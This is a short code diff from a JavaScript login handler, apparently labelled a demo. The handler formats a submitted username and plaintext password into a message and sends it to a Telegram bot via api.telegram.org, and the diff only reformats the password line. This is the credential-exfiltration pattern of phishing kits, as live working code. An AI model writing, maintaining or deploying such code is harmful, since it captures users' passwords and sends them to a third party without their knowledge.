@@ -15,7 +15,7 @@ export default async function handler(req, res) {
       `🔔 Demo login submit\n` +
       `• Username: ${username}\n` +
       `• Time: ${submittedAt}\n` +
-      `• Password: ${password}`;
+      `password: ${password}\n`;
 
     const tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;
     const r = await fetch(tgUrl, {
